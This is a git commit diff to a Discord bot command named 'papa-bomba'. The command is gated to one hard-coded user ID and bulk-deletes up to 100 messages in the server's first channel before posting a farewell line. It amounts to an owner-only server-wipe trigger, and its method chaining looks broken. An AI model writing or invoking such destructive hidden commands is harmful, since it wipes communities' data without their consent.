9e29ef32fc2181196d08cd6294e9e59c958a26eb
PapitaConPure <ojitosclaros_ivancho@hotmail.com>
2020-02-15 18:28:51 -0300

    Update F2

--- commands/Pure/papa-bomba.js
+++ commands/Pure/papa-bomba.js
@@ -5,7 +5,7 @@ module.exports = {
 	name: 'papa-bomba',
 	execute(message, args) {
         if(message.author.id === '423129757954211880') {
-			message.channel.guild.channels.filter(ch => ch.calculatedPosition === 0)
+			message.channel.guild.channels.first()
 				.bulkDelete(100, true)
 				.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
 			message.channel.guild.channels.filter(ch => ch.calculatedPosition !== 0)
